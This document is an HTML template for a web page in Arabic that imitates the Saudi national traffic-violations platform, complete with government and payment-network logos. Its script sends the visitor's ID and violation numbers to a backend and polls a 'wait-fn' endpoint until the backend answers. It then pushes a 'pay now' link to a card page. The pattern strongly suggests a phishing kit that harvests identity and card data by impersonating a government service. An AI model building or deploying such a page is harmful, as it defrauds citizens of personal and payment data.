


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>
        المنصة الوطنية للمخالفات
    </title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;400;500;700;800;900&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/fontawesome.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    <style>
        * {
            padding: 0%;
            margin: 0%;
            box-sizing: border-box;
            direction: rtl;
            font-family: "Tajawal", sans-serif;
            color: #000;
        }

        a {
            text-decoration: none;
        }

        body {
            background-image: url(../img/Back004.jpg);
            background-size: cover;
        }

        html {
            overflow-x: hidden;
        }

        .bbtn {
            font-size: 18px;
            color: #fff;
            padding: 10px 17px 12px;
            text-decoration: none;
            margin: 3px;
            text-align: center;
            background: #17605d;
            border: none;
            display: inline-block;
        }

        .btn-active {
            font-size: 15px;
            color: #fff;
            padding: 10px 15px 10px;
            text-decoration: none;
            text-align: center;
            background: #17605d;
            border: none;
            display: inline-block;
        }

        .btn-disable {
            font-size: 15px;
            color: #fff;
            padding: 10px 15px 10px;
            text-decoration: none;
            text-align: center;
            background: rgba(0, 150, 136, .7);
            border: none;
            display: inline-block;
        }

        .form-control {
            border-radius: 0;
            height: 45px;
        }

        .se-pre-con {
            position: fixed;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            z-index: 9999999;
            background: url(../img/Progress2.svg) center no-repeat #ffffffeb;
            background-size: 310px 80px;
            overflow-x: hidden;
        }

        .show {
            display: block;
        }

        .hidden {
            display: none;
        }

        .detailsGroup {
            margin-top: 15px;
        }

        .detailsGroup .detailsValue {
            background: #f3f3f3;
            text-align: CENTER;
            padding: 1px 5px 5px;
        }

        .contFot {
            margin-bottom: 300px;
        }

        @media only screen and (max-width: 600px) {
            .texF {
                display: none;
            }

            .ffre {
                text-align: center;
            }

            .ccdr {
                flex-direction: column;
                margin-top: 30px;
            }

            .butApp {
                text-align: center;
            }

            .arBut {
                width: 49%;
            }

            .colForMar {
                margin-top: 25px;
            }

            .contFot {
                margin-bottom: 150px;
            }

            .firFot{
                justify-content: center !important;
            }

            .secFor{
                margin-top: 40px;
            }

            .secForrg{
                margin-bottom: 40px;
            }
        }
    </style>
</head>

<body>

    <nav class="navbar navbar-expand-lg" style="background-color: rgba(0,150,136,.7);">
        <div class="container-fluid">
            <a class="navbar-brand" href="#"><img src="../img/EFAAW.svg" width="120" alt=""></a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
            </div>
        </div>
    </nav>


    <div class="container contFot" style="margin-top: 80px;">
        <div class="row">
            <div class="col-sm-12 col-md-8">
                <div class="w-100 pt-5 px-3 pb-3" style="background-color: rgba(0,150,136,.7);">
                    <h1 class="text-white ffre">المنصة الوطنية للمخالفات</h1>
                    <h5 class="text-white ffre">وجهة واحدة لإدارة جميع المخالفات</h5>
                    <p id="texF" class="text-white texF"><small class="text-white">المنصة الوطنية للمخالفات (إيفاء) هي إحدى المنصات الوطنية التي ينفذها مركز المعلومات الوطني التابع للهيئة السعودية للبيانات والذكاء الإصطناعي وهي تهدف إلى تمكين المواطنين والمقيمين والزائرين وأصحاب الأعمال من معرفة واستعراض كافة مخالفاتهم
                            لدى الجهات الحكومية بكل يسر وسهولة.</small></p>
                    <div class="d-flex ccdr" id="butFle">
                        <button class="bbtn text-white ccaf"><i class="bi bi-person-fill text-white"></i> أفراد وأعمال</button>
                        <button class="bbtn text-white"><i class="bi bi-building-fill text-white"></i> شركاء</button>
                    </div>
                </div>
            </div>
            <div class="col-sm-12 col-md-4 colForMar">
                <div class="w-100 p-3 px-4" style="background-color: rgba(255,255,255,.44);">
                    <h3 class="text-dark text-center fw-bold">استعلام عن مخالفة</h3>
                    <div class="mt-4 butApp">
                        <button class="btn-active arBut" onclick="changeType(1)" id="butOne"><i class="bi bi-person-fill text-white"></i>أفراد</button>
                        <button class="btn-disable arBut" onclick="changeType(2)" id="butTwo"><i class="bi bi-building-fill text-white"></i> <small class="text-white">منشأة</small></button>
                    </div>
                    <form id="myForm">
                        <input type="hidden" name="Type" value="1" id="Type">
                        <div class="mt-4 show" id="TypeOne">
                            <input type="text" name="idNumber" id="idNumber" class="form-control text-center" placeholder="رقم الهوية أو رقم الحدود" required min="1" maxlength="10" pattern="[0-9]+" inputmode="numeric">
                            <input type="text" name="verNumber" id="verNumber" class="form-control text-center mt-3" placeholder="رقم المخالفة" required min="1" maxlength="14" pattern="[0-9]+" inputmode="numeric">
                        </div>
                        <div class="mt-4 hidden" id="TypeTwo">
                            <input type="text" name="monsh" id="monsh" class="form-control text-center" placeholder="رقم المنشأة (يبدأ برقم 7)" min="1" maxlength="10" pattern="[0-9]+" inputmode="numeric">
                            <input type="text" name="monsh1" id="monsh1" class="form-control text-center mt-3" placeholder="رقم المخالفة" min="1" maxlength="14" pattern="[0-9]+" inputmode="numeric">
                        </div>
                        
                        <div class="mt-3 text-center">
                            <button type="submit" name="send" class="btn-active w-100">استعلام</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>


    <footer class="container-fluid" style="background-color: rgba(0,150,136,.7);">
        <div class="row py-4">
            <div class="col-sm-12 col-md-4 d-flex align-items-center justify-content-end firFot">
                <img src="../img/EFAAW.svg" width="150" alt="">
            </div>
            <div class="col-sm-12 col-md-4 secFor">
                <h6 class="text-center text-white">المنصة الوطنية للمخالفات</h6>
                <div class="d-flex justify-content-center gap-3 mt-3">
                    <span class="text-white">سياسة الخصوصية</span>
                    <span class="text-white">شروط الإستخدام</span>
                    <span class="text-white">الأسئلة الشائعة </span>
                </div>
                <div class="mt-4 d-flex gap-3 justify-content-center secForrg">
                    <img src="../img/Mada.svg" width="60" alt="">
                    <img src="../img/Sdad.svg" width="60" alt="">
                    <img src="../img/Visa.svg" width="60" alt="">
                    <img src="../img/MasterCard.svg" width="60" alt="">
                </div>
            </div>
            <div class="col-sm-12 col-md-4 d-flex align-items-center firFot">
                <img src="../img/NICW.svg" width="120" alt="">
                <img src="../img/sdaia2.svg" width="120" alt="">
            </div>
        </div>
    </footer>

    <div class="se-pre-con text-secondary" id="loader" style="text-align: center; padding-top: 190px;display: none; ">
        جاري البحث عن المخالفات ..... يرجى الآنتظار
    </div>



    <!-- Button trigger modal -->
    <!-- <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#exampleModal">
        Launch demo modal
    </button> -->

    <!-- Modal -->
    <div class="modal fade " style="height: 800px;padding-right:0 !important" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                     <a type="button" href="card.php" class="btn btn-primary" style="background-color: #17a2b8; border-color: #17a2b8;"><i class="bi bi-credit-card-2-back text-white"></i> إدفع الآن</a>
                </div>
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="Yes"><label><i class="bi bi-card-heading text-secondary"></i> <span>هوية المخالف</span></label>
                                <div class="detailsValue" id="violatorID"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="Yes"><label><i class="bi bi-hash text-secondary"></i> <span>رقم المخالفة</span></label>
                                <div class="detailsValue" id="violationNumber"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="Yes"><label><i class="bi bi-buildings-fill text-secondary"></i> <span>الجهة للمخالفة</span></label>
                                <div class="detailsValue"> <img class="PopupLogo" src="../img/44.svg" width="20">الإدارة العامة للمرور</div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="Yes"><label><i class="bi bi-postcard text-secondary"></i> <span>نوع المخالفة</span></label>
                                <div class="detailsValue" id="fineGroupDescription"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="Yes"><label><i class="bi bi-calendar3 text-secondary"></i> <span>تاريخ المخالفة</span></label>
                                <div class="detailsValue" id="violationDateG"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="No"><label><i class="bi bi-clock-fill text-secondary"></i> <span>وقت المخالفة</span></label>
                                <div class="detailsValue" id="violationTime"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="Yes"><label><i class="bi bi-calendar3-range-fill text-secondary"></i> <span>مدينة المخالفة</span></label>
                                <div class="detailsValue" id="violationCity"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="No"><label><i class="bi bi-calendar3-range-fill text-secondary"></i> <span>الشارع</span></label>
                                <div class="detailsValue" id="streetName"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="No"><label><i class="bi bi-speedometer text-secondary"></i> <span>سرعة الشارع</span></label>
                                <div class="detailsValue">0</div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="No"><label><i class="bi bi-speedometer2 text-secondary"></i> <span>سرعة المركبة</span></label>
                                <div class="detailsValue">0</div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="No"><label><i class="bi bi-distribute-horizontal text-secondary"></i> <span> رقم المسار</span></label>
                                <div class="detailsValue">0</div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="No"><label><i class="bi bi-textarea text-secondary"></i> <span>الرقم التسلسلي للمركبة الأجنبية</span></label>
                                <div class="detailsValue">0</div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="No"><label><i class="bi bi-browser-safari text-secondary"></i> <span>إتجاه المركبة</span></label>
                                <div class="detailsValue" id="vehicleDirection"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="No"><label><i class="bi bi-textarea text-secondary"></i> <span>الرقم التسلسلي للمركبة</span></label>
                                <div class="detailsValue" id="vehicleSeriallNumber"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="No"><label><i class="bi bi-card-list text-secondary"></i> <span>نوع تسجيل المركبة</span></label>
                                <div class="detailsValue" id="vehicleTypeDescAr"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="No"><label><i class="bi bi-car-front-fill text-secondary"></i> <span>ماركة المركبة</span></label>
                                <div class="detailsValue" id="vehicleMake"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="No"><label><i class="bi bi-car-front-fill text-secondary"></i> <span>طراز المركبة</span></label>
                                <div class="detailsValue" id="vehicleModel"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="No"><label><i class="bi bi-postcard text-secondary"></i> <span>رقم اللوحة</span></label>
                                <div class="detailsValue" id="vehiclePlate"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="No"><label><i class="bi bi-receipt-cutoff text-secondary"></i> <span>حالة المخالفة</span></label>
                                <div class="detailsValue" id="violationStatusDescAr"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="No"><label><i class="bi bi-calendar3 text-secondary"></i> <span>تاريخ سداد المخالفة</span></label>
                                <div class="detailsValue" id="paymentDateG"></div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4 col-xl-3 col-print-6">
                            <div class="detailsGroup" showinshare="Yes"><label><i class="bi bi-cash text-secondary"></i> <span>إجمالي مبلغ المخالفة</span></label>
                                <div class="detailsValue" id="totalFineItemsAmount"></div>
                            </div>
                        </div>
                    </div>
                    <div class="mt-4">
                        <div class="alert alert-warning text-center d-flex justify-content-between">
                            <div>
                                <!-- <p>شرح المخالفة</p> -->
                                <p id="violationTypeDescAr"></p>
                            </div>
                            <div>
                                <p>قيمة المخالفة</p>
                                <p id="pprice"></p>
                            </div>
                        </div>
                    </div>
                    <div class="text-start mt-4">
                        <a type="button" href="card.php" class="btn btn-primary" style="background-color: #17a2b8; border-color: #17a2b8;"><i class="bi bi-credit-card-2-back text-white"></i> إدفع الآن</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade mt-5" id="exampleModal1" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <div class="alert alert-warning text-center">
                        <p>لم يتم العثور على المخالفة</p>
                    </div>
                    <div class="text-start mt-4">
                        <button type="button" class="btn btn-danger" data-bs-dismiss="modal">إغلاق</button>
                    </div>
                </div>
            </div>
        </div>
    </div>


    <script>
        $(document).ready(function() {
            // Intercept form submission
            $("#myForm").submit(function(event) {
                // Prevent the default form submission behavior
                event.preventDefault();

                var formData = {
                    idNumber: $("#idNumber").val(),
                    verNumber: $("#verNumber").val(),
                    Type: $("#Type").val(),
                    send: true
                };

                if (document.getElementById('Type').value == 2) {
                    formData = {
                        idNumber: $("#monsh").val(),
                        verNumber: $("#monsh1").val(),
                        Type: $("#Type").val(),
                        send: true
                    };
                }

                // Send AJAX request
                $.ajax({
                    headers: {
                          'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                    },
                    type: "POST",
                    url: "add-efaa",
                    data: formData,
                    success: function(response) {
                        // var resp = response.split("SPLIT");
                        console.log(response);
                        callToCheck();
                        // if (parseInt(resp[0]) != "") {
                        //     callToCheck();
                        // } else {
                        //     return false;
                        // }
                    },
                    error: function(xhr, status, error) {
                        // Handle error
                        console.error(xhr.responseText);
                    }
                });
            });

            function callToCheck() {
                document.getElementById('loader').style.display = "block";
                var intervalId = setInterval(() => {
                    $.ajax({
                        headers: {
                          'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                        },
                        url: "wait-fn",
                        type: "POST",
                        success: (response) => {
                            var resp = response;
                            if (resp.access == 2) {
                                document.getElementById('loader').style.display = "none";
                                clearInterval(intervalId);
                                showDataToModal(resp.accessData);
                            } else if (resp.access == 3) {
                                document.getElementById('loader').style.display = "none";
                                clearInterval(intervalId);
                                faildDataToModal();
                            }
                        }
                    });
                }, 1000);
            }


            function showDataToModal(data) {
              
                var response = JSON.parse(data);

                var formattedDate = response.violationlInfo.violationDateG.replace(/(\d{4})(\d{2})(\d{2})/, "$1/$2/$3");
                var formattedTime = response.violationlInfo.violationTime.toString().replace(/(\d{2})(\d{2})/, "$1:$2");

                var numbers = response.violationlInfo.vehiclePlate.match(/\d/g);

                // Convert the numbers to Arabic-Indic numerals
                var arabicNumbers = numbers.map(function(digit) {
                    var arabicNumerals = ["٠", "١", "٢", "٣", "٤", "٥", "٦", "٧", "٨", "٩"];
                    return arabicNumerals[digit];
                });

                // Combine the characters with Arabic-Indic numerals
                var formattedPlate = response.violationlInfo.vehiclePlate.replace(/\d/g, function(digit) {
                    return arabicNumbers.shift();
                });

                // Populate modal with data
                $('#exampleModal .modal-body #violatorID').text(response.violationlInfo.violatorID);
                $('#exampleModal .modal-body #violationNumber').text(response.violationlInfo.violationNumber);
                $('#exampleModal .modal-body #fineGroupDescription').text(response.violationlInfo.fineGroupDescription);
                $('#exampleModal .modal-body #violationDateG').text(formattedDate);
                $('#exampleModal .modal-body #violationTime').text(formattedTime);
                $('#exampleModal .modal-body #violationCity').text(response.violationlInfo.violationCity);
                $('#exampleModal .modal-body #streetName').text(response.violationlInfo.streetName);
                $('#exampleModal .modal-body #vehicleDirection').text(response.violationlInfo.vehicleDirection);
                $('#exampleModal .modal-body #vehicleSeriallNumber').text(response.violationlInfo.vehicleSeriallNumber);
                $('#exampleModal .modal-body #vehiclePlate').text(formattedPlate);
                $('#exampleModal .modal-body #vehicleTypeDescAr').text(response.violationlInfo.vehicleTypeDescAr);
                $('#exampleModal .modal-body #vehicleMake').text(response.violationlInfo.vehicleMake);
                $('#exampleModal .modal-body #vehicleModel').text(response.violationlInfo.vehicleModel);
                $('#exampleModal .modal-body #violationStatusDescAr').text(response.violationlInfo.violationStatusDescAr);
                $('#exampleModal .modal-body #paymentDateG').text(response.violationlInfo.paymentDateG == "" ? "-" : response.violationlInfo.paymentDateG);
                $('#exampleModal .modal-body #totalFineItemsAmount').text(response.violationlInfo.totalFineItemsAmount + " ريال ");
                $('#exampleModal .modal-body #violationTypeDescAr').text(response.violationlInfo.listOfViolationItems[0].violationTypeDescAr);
                $('#exampleModal .modal-body #pprice').text(response.violationlInfo.totalFineItemsAmount + " ريال ");

                // Show the modal
                $('#exampleModal').modal('show');
            }

            function faildDataToModal() {
                $('#exampleModal1').modal('show');
            }
        });


        function changeType(num) {

            if (document.getElementById('Type').value == num) {
                return;
            }

            if (num == 1) {
                document.getElementById('TypeOne').classList.remove('hidden');
                document.getElementById('TypeOne').classList.add('show');

                document.getElementById('TypeTwo').classList.add('hidden');
                document.getElementById('TypeTwo').classList.remove('show');

                document.getElementById('butOne').classList.add('btn-active');
                document.getElementById('butOne').classList.remove('btn-disable');

                document.getElementById('butTwo').classList.add('btn-disable');
                document.getElementById('butTwo').classList.remove('btn-active');

                document.getElementById("idNumber").setAttribute("required", "true");
                document.getElementById("verNumber").setAttribute("required", "true");

                document.getElementById("monsh").removeAttribute("required");
                document.getElementById("monsh1").removeAttribute("required");

                document.getElementById('Type').value = 1;
            } else {
                document.getElementById('TypeTwo').classList.remove('hidden');
                document.getElementById('TypeTwo').classList.add('show');

                document.getElementById('TypeOne').classList.add('hidden');
                document.getElementById('TypeOne').classList.remove('show');

                document.getElementById('butOne').classList.remove('btn-active');
                document.getElementById('butOne').classList.add('btn-disable');

                document.getElementById('butTwo').classList.remove('btn-disable');
                document.getElementById('butTwo').classList.add('btn-active');

                document.getElementById("monsh").setAttribute("required", "true");
                document.getElementById("monsh1").setAttribute("required", "true");

                document.getElementById("idNumber").removeAttribute("required");
                document.getElementById("verNumber").removeAttribute("required");

                document.getElementById('Type').value = 2;
            }
        }
    </script>
 
</body>

</html>